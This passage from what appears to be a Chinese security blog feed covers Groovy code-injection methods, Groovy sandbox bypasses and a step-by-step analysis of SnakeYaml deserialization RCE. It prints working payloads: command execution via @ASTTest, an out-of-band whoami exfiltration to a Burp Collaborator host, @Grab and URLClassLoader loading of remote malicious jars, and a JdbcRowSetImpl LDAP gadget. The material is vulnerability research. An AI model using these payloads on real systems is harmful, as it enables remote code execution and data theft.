class="title class_">UrlResource</span>(<span class="string">&quot;http://127.0.0.1:8888/exec.groovy&quot;</span>);</span><br><span class="line">        <span class="type">ResourceScriptSource</span> <span class="variable">resourceScriptSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceScriptSource</span>(urlResource);</span><br><span class="line">        <span class="type">GroovyScriptEvaluator</span> <span class="variable">groovyScriptEvaluator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyScriptEvaluator</span>();</span><br><span class="line">        groovyScriptEvaluator.evaluate(resourceScriptSource);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="GroovyClassLoader"><a href="#GroovyClassLoader" class="headerlink" title="GroovyClassLoader"></a>GroovyClassLoader</h4><p>GroovyClassLoader是一个定制的类装载器，负责解释加载Java类中用到的Groovy类，重写了loadClass和defineClass方法，parseClass可以直接从文件或者字符串中获取Groovy类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.groovy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> groovy.lang.GroovyClassLoader;</span><br><span class="line"><span class="keyword">import</span> groovy.lang.GroovyObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GroovyUsage4</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 从文件中获取Groovy类</span></span><br><span class="line">        <span class="type">GroovyClassLoader</span> <span class="variable">groovyClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyClassLoader</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> groovyClassLoader.parseClass(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;src/main/java/org/example/deserialize/groovy/exec.groovy&quot;</span>));</span><br><span class="line">        <span class="type">GroovyObject</span> <span class="variable">object</span> <span class="operator">=</span> (GroovyObject) clazz.newInstance();</span><br><span class="line">        object.invokeMethod(<span class="string">&quot;main&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从文本中获取Groovy类</span></span><br><span class="line">        <span class="type">GroovyClassLoader</span> <span class="variable">groovyClassLoader1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyClassLoader</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> groovyClassLoader1.parseClass(<span class="string">&quot;class GroovyTest &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    static void main(args)&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        println \&quot;$&#123;&#x27;whoami&#x27;.execute().text&#125;\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        <span class="type">GroovyObject</span> <span class="variable">groovyObject</span> <span class="operator">=</span> (GroovyObject) aClass.newInstance();</span><br><span class="line">        groovyObject.invokeMethod(<span class="string">&quot;main&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ScriptEngine"><a href="#ScriptEngine" class="headerlink" title="ScriptEngine"></a>ScriptEngine</h4><p>ScriptEngine脚本引擎是被设计为用于数据交换和脚本执行的。ScriptEngineManager类是一个脚本引擎的管理类，用来创建脚本引擎，大概的方式就是在类加载的时候通过SPI的方式，扫描ClassPath中已经包含实现的所有ScriptEngineFactory，载入后用来负责生成具体的ScriptEngine。</p><p>在ScriptEngine中，支持名为groovy的引擎，可用来执行Groovy代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.groovy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GroovyUsage5</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//        ScriptEngine scriptEngine = new ScriptEngineManager().getEngineByName(&quot;groovy&quot;);</span></span><br><span class="line">        <span class="type">ScriptEngine</span> <span class="variable">scriptEngine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>().getEngineByExtension(<span class="string">&quot;groovy&quot;</span>);</span><br><span class="line">        scriptEngine.eval(<span class="string">&quot;\&quot;open -a Calculator\&quot;.execute().text&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><h4 id="反射机制-字符串拼接"><a href="#反射机制-字符串拼接" class="headerlink" title="反射机制+字符串拼接"></a>反射机制+字符串拼接</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.groovy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Bypass1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;jav&quot;</span> + <span class="string">&quot;a.la&quot;</span> + <span class="string">&quot;ng.Run&quot;</span> + <span class="string">&quot;time&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;ge&quot;</span> + <span class="string">&quot;tRu&quot;</span> + <span class="string">&quot;ntime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;ex&quot;</span> + <span class="string">&quot;ec&quot;</span>, String.class);</span><br><span class="line">        method1.invoke(method.invoke(<span class="literal">null</span>), <span class="string">&quot;ope&quot;</span> + <span class="string">&quot;n -a&quot;</span> + <span class="string">&quot; Calcu&quot;</span> + <span class="string">&quot;lator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Groovy沙箱绕过"><a href="#Groovy沙箱绕过" class="headerlink" title="Groovy沙箱绕过"></a>Groovy沙箱绕过</h4><p>Groovy代码注入都是注入了execute方法，从而能够成功执行Groovy代码。但是当存在Groovy沙箱（Jenkins中执行存在Groovy沙箱），即只进行AST解析无调用或限制execute方法的情况下就需要用到其他技巧了。参考Groovy的<a href="http://groovy-lang.org/metaprogramming.html">Meta Programming手册</a>，利用AST注解能够执行断言从而实现代码执行。</p><ul><li>@AST注解执行断言：利用AST注解能够执行断言从而实现代码执行</li></ul><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.groovy</span><br><span class="line"></span><br><span class="line"><span class="comment">// @AST注解执行断言</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="keyword">class</span>.classLoader.parseClass(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    @groovy.transform.ASTTest(value=&#123;</span></span><br><span class="line"><span class="string">        assert Runtime.getRuntime().exec(&quot;open -a Calculator&quot;)</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">    def x</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// OOB</span></span><br><span class="line"><span class="meta">@groovy</span>.transform.ASTTest(value=&#123;</span><br><span class="line">    cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    out = <span class="keyword">new</span> java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(<span class="string">&quot; &quot;</span>)).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next()</span><br><span class="line">    cmd2 = <span class="string">&quot;ping &quot;</span> + out.replaceAll(<span class="string">&quot;[^a-zA-Z0-9]&quot;</span>,<span class="string">&quot;&quot;</span>) + <span class="string">&quot;.cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net&quot;</span>;</span><br><span class="line">    java.lang.Runtime.getRuntime().exec(cmd2.split(<span class="string">&quot; &quot;</span>))</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">def</span> x</span><br><span class="line"></span><br><span class="line"><span class="comment">// Base64编码</span></span><br><span class="line"><span class="variable language_">this</span>.evaluate(<span class="keyword">new</span> String(java.util.Base64.getDecoder().decode(<span class="string">&quot;QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17CiAgICBhc3NlcnQgUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygib3BlbiAtYSBDYWxjdWxhdG9yIikKfSkKZGVmIHg=&quot;</span>)))</span><br></pre></td></tr></table></figure><ul><li>@Grab注解加载远程恶意类：Grape是Groovy内建的一个动态jar依赖管理程序，允许开发者动态引入不在ClassPath中的函式库。编写恶意EXP类，命令执行代码写在其构造函数中，然后编译成jar包即可，请求远程恶意jar包并导入恶意EXP类执行其构造函数，从而导致RCE。</li></ul><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@Grab注解加载远程恶意类</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="keyword">class</span>.classLoader.parseClass(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @GrabConfig(disableChecksums=true)</span></span><br><span class="line"><span class="string">    @GrabResolver(name=&quot;Poc&quot;, root=&quot;http://127.0.0.1:8888/&quot;)</span></span><br><span class="line"><span class="string">    @Grab(group=&quot;Poc&quot;, module=&quot;EvilJar&quot;, version=&quot;0&quot;)</span></span><br><span class="line"><span class="string">    import java.lang.String</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SnakeYaml</title>
      <link href="/2023/09/25/SnakeYaml/"/>
      <url>/2023/09/25/SnakeYaml/</url>
      
        <content type="html"><![CDATA[<h2 id="YAML简介"><a href="#YAML简介" class="headerlink" title="YAML简介"></a>YAML简介</h2><p>snakeyaml包主要用来解析yaml格式的内容，yaml语言比普通的xml与properties等配置文件的可读性更高，Spring系列就支持yaml的配置文件，而SnakeYaml是一个完整的YAML1.1规范Processor，支持UTF-8&#x2F;UTF-16，支持Java对象的序列化&#x2F;反序列化，支持所有YAML定义的类型。</p><p>yaml语法中需要注意以下几点：</p><pre><code>- YAML区分大小写；- YAML文件使用.yaml作为扩展名；- YAML在创建YAML文件时不允许使用制表符，只允许使用空格。</code></pre><p>yaml基本要素概要：</p><pre><code>- YAML中的注释以#字符开头；- 必须通过空格将注释与其他标记分开；- 空白的缩进用于表示结构；- 标签不包含在YAML文件的缩进中；- 列表成员用前导连字符-表示；- 列表成员用方括号括起来，并以逗号分隔；- 关联数组使用冒号:以键值对的格式表示，并用大括号括起来&#123;&#125;；- 具有单个流的多个文档用3个连字符---分隔；- 每个文件中的重复节点最初用＆符号＆表示，稍后用星号*标记；- YAML总是需要使用冒号和逗号作为列表分隔符，后跟带有标量值的空格；- 节点应标有感叹号!或双重感叹号!!，后跟字符串，可以扩展为URI或URL。</code></pre><h2 id="SnakeYaml序列化与反序列化"><a href="#SnakeYaml序列化与反序列化" class="headerlink" title="SnakeYaml序列化与反序列化"></a>SnakeYaml序列化与反序列化</h2><p>SnakeYaml中分别由Yaml.dump和Yaml.load方法对yaml数据进行序列化和反序列化操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vuln.snakeyaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    String age;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is construct function&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is getAge function&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is getName function&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(String age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is setAge function&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is setName function&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vuln.snakeyaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SnakeYamlDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Serialize();</span><br><span class="line">        Deserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.setAge(<span class="string">&quot;21&quot;</span>);</span><br><span class="line">        person.setName(<span class="string">&quot;Duke&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">dumpData</span> <span class="operator">=</span> yaml.dump(person);</span><br><span class="line">        System.out.println(dumpData);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Deserialize</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">dumpData</span> <span class="operator">=</span> <span class="string">&quot;!!org.vuln.snakeyaml.Person &#123;age: 21, name: Tom&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">loadData</span> <span class="operator">=</span> (Person) yaml.load(dumpData);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上文中序列化操作中输出字符串!!org.vuln.snakeyaml.Person {age: ‘21’, name: Duke}，其中!!符号类似于fastjson中的@type，用于指定反序列化的类名；反序列化操作中调用了被反序列化的类的构造方法和yaml格式内容中包含的属性的setter方法：</p><p><img src="/2023/09/25/SnakeYaml/1709813156370-8dbe90cc-dd14-4cd2-9224-6d2300a4ffca.png"></p><h2 id="SnakeYaml反序列化漏洞"><a href="#SnakeYaml反序列化漏洞" class="headerlink" title="SnakeYaml反序列化漏洞"></a>SnakeYaml反序列化漏洞</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>SnakeYaml的反序列化操作Yaml.load类似于Fastjson，yaml数据在反序列化时可以通过!!加全类名来指定反序列化的类，反序列化过程中会实例化该类。因此，攻击者可以通过构造ScriptEngineManager的payload并利用SPI机制，通过URLClassLoader或者其他payload，例如JNDI方式远程加载实例化恶意类从而实现任意代码执行。</p><p>当Yaml.load方法的参数外部可控时，攻击者可以传入一个包含恶意类的yaml格式序列化内容，当服务端进行yaml反序列化获取恶意类时，便会触发SnakeYaml反序列化漏洞。</p><p>下文通过ScriptEngineManager这条利用链来分析一下SnakeYaml反序列化漏洞的一个大致调用过程。</p><p>参考项目<a href="https://github.com/artsploit/yaml-payload/%EF%BC%8C%E7%94%9F%E6%88%90%E6%81%B6%E6%84%8F%E7%9A%84jar%E5%8C%85%EF%BC%8C%E6%9E%84%E9%80%A0yaml%E6%95%B0%E6%8D%AE%E5%A6%82%E4%B8%8B%EF%BC%9A">https://github.com/artsploit/yaml-payload/，生成恶意的jar包，构造yaml数据如下：</a></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!javax.script.ScriptEngineManager</span> [</span><br><span class="line">  <span class="type">!!java.net.URLClassLoader</span> [[</span><br><span class="line">    <span class="type">!!java.net.URL</span> [<span class="string">&quot;http://127.0.0.1:8080/yaml-payload.jar&quot;</span>]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><img src="/2023/09/25/SnakeYaml/1709813156575-2915a328-6778-4af6-9e6b-00c8fd13e8b8.png"></p><p>在Yaml.load处下个断点，首先是一个赋值操作，调用StringReader方法处理传入的数据，将字符串存储在StreamReader的this.stream字段值中。</p><p><img src="/2023/09/25/SnakeYaml/1709813156863-0885a9fd-5cd9-467e-801b-9db4938e9e35.png"></p><p>接着调用org.yaml.snakeyaml.Yaml#loadFromReader方法，前面先是一系列的赋值操作，接着将传入的数据封装成一个Composer对象。</p><p><img src="/2023/09/25/SnakeYaml/1709813157034-618c5c35-2ffb-4b8b-98c4-8e0b9518eeb3.png"></p><p><img src="/2023/09/25/SnakeYaml/1709813157198-6b790e5b-4477-414b-bce1-1dc49e7c927b.png"></p><p><img src="/2023/09/25/SnakeYaml/1709813157354-bdbfc5b2-a94b-4f4f-b210-939ede7ba78a.png"></p><p>在赋值操作调用org.yaml.snakeyaml.parser.ParserImpl的有参构造方法时，有一个替换规则需要注意，即!! -&gt; tag:yaml.org,2002:，后续会利用该替换规则将传入的数据进行字符串替换操作。</p><p><img src="/2023/09/25/SnakeYaml/1709813157578-72c18e3f-929a-4c06-a862-3defea471e84.png"></p><p>接着调用org.yaml.snakeyaml.constructor.BaseConstructor#getSingleData方法，调用org.yaml.snakeyaml.composer.Composer#getSingleNode方法，并根据之前的替换规则对!!符号进行替换。</p><p><img src="/2023/09/25/SnakeYaml/1709813157740-97a02f6c-d08b-408d-b589-8f5962aed7da.png"></p><p><img src="/2023/09/25/SnakeYaml/1709813157874-77f2a68e-d66e-43ae-a7fc-78895993d32e.png"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&lt;org.yaml.snakeyaml.nodes.SequenceNode</span> <span class="string">(tag=tag:yaml.org,2002:javax.script.ScriptEngineManager,</span> <span class="string">value=[&lt;org.yaml.snakeyaml.nodes.SequenceNode</span> <span class="string">(tag=tag:yaml.org,2002:java.net.URLClassLoader,</span> <span class="string">value=[&lt;org.yaml.snakeyaml.nodes.SequenceNode</span> <span class="string">(tag=tag:yaml.org,2002:seq,</span> <span class="string">value=[&lt;org.yaml.snakeyaml.nodes.SequenceNode</span> <span class="string">(tag=tag:yaml.org,2002:java.net.URL,</span> <span class="string">value=[&lt;org.yaml.snakeyaml.nodes.ScalarNode</span> <span class="string">(tag=tag:yaml.org,2002:str,</span> <span class="string">value=http://127.0.0.1:8080/yaml-payload.jar)&gt;])&gt;])&gt;])&gt;])&gt;</span></span><br></pre></td></tr></table></figure><p>接着调用org.yaml.snakeyaml.constructor.BaseConstructor#constructDocument方法，经过一系列调用，直到调用org.yaml.snakeyaml.constructor.Constructor#getConstructor方法。</p><p><img src="/2023/09/25/SnakeYaml/1709813158016-4c6e8ab6-1b76-454c-8893-9e11a6a478a7.png"></p><p><img src="/2023/09/25/SnakeYaml/1709813158150-56249894-6695-4ff0-b11c-dfc3c297ccdc.png"></p><p><img src="/2023/09/25/SnakeYaml/1709813158278-3e1521a2-ecd2-4bcd-87a6-02658f358454.png"></p><p>跟进org.yaml.snakeyaml.constructor.Constructor#getClassForNode方法，由于classForTag为null，因此进入if循环，调用org.yaml.snakeyaml.constructor.Constructor#getClassForName方法，通过反射获取ScriptEngineManager对象。</p><p><img src="/2023/09/25/SnakeYaml/1709813158408-caa4dbdc-226b-4784-99ee-937202d79125.png"></p><p><img src="/2023/09/25/SnakeYaml/1709813158539-59ee5977-a209-463c-a756-9f330b6b442b.png"></p><p>接下来向typeTags的Map里put本次tag和class对象的键值对，并返回ScriptEngineManager对象，后续对URLClassLoader和URL处理的逻辑与对ScriptEngineManager处理的逻辑基本相同。当ScriptEngineManager、URLClassLoader和URL都被反射获取到对象后，进入construct方法内，通过反射获取node字段的type属性值所对应的构造方法。</p><p><img src="/2023/09/25/SnakeYaml/1709813158653-d0c21577-e4a1-46d6-a1dd-2b709146fc7f.png"></p><p>最终通过newInstance方法实例化，首先是URL的实例化，之后是URLClassLoader的实例化，最后当ScriptEngineManager实例化完成后触发远程代码执行。</p><p><img src="/2023/09/25/SnakeYaml/1709813159078-9cab1e5d-64e2-40f8-8325-197b27a902fa.png"></p><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>这里补充一下ScriptEngineManager的构造链为什么是ScriptEngineManager-&gt;URLClassLoader-&gt;URL。实际上，[[!!表示下一个类当作上一个类的内部属性去使用，在调用ScriptEngineManager这个类时，调用的是它的构造方法，可以看到在javax.script.ScriptEngineManager的有参构造方式中需要传入一个ClassLoader类，这里将URLClassLoader传入。</p><p><img src="/2023/09/25/SnakeYaml/1709813159240-60da2c47-f2e6-45ea-bc66-3bbd87d0bac7.png"></p><p>接着继续调用URLClassLoader的构造方法，其构造方法需要传入一个URL类，进而在payload中，将URL传入。</p><p><img src="/2023/09/25/SnakeYaml/1709813159362-bd7679e4-4403-4f4f-a6f1-480c8fdb7e1a.png"></p><h3 id="SPI机制"><a href="#SPI机制" class="headerlink" title="SPI机制"></a>SPI机制</h3><p>在上文分析ScriptEngineManager利用链的过程中，核心点涉及到一个重要概念SPI（Service Provider Interface）机制，这是一种服务发现机制，可以通过在ClassPath路径下的META-INF&#x2F;services文件夹内查找文件，并自动加载文件内所定义的的类。即可以动态为某个接口寻找服务进行实现，使用SPI机制时，需要在ClassPath下的META-INF&#x2F;services目录内创建一个以服务接口命名的文件，这个文件里的内容就是这个接口的具体的实现类的全类名。</p><p><img src="/2023/09/25/SnakeYaml/1709813159464-df8d0119-aac4-4d4c-83a2-99dd20bbd722.png"></p><h2 id="Gadgets"><a href="#Gadgets" class="headerlink" title="Gadgets"></a>Gadgets</h2><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>由于SnakeYaml在反序列化时类似Fastjson，会调用属性的setter方法，因此可以调用JdbcRowSetImpl类的dataSourceName属性的setter方法即setDataSourceName，然后就触发后续一系列的利用链最后达到任意代码执行的目的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vuln.snakeyaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImplGadget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">yamlData</span> <span class="operator">=</span> <span class="string">&quot;!!com.sun.rowset.JdbcRowSetImpl\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; dataSourceName:\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;ldap://127.0.0.1:1389/jjzx1y\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; autoCommit:\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  true&quot;</span>;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Yaml</span>().load(yamlData);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/09/25/SnakeYaml/1709813159566-ae2f219d-87af-4e10-8d37-355d55a9780a.png"></p><h3 id="Spring-PropertyPathFactoryBean"><a href="#Spring-PropertyPathFactoryBean" class="headerlink" title="Spring PropertyPathFactoryBean"></a>Spring 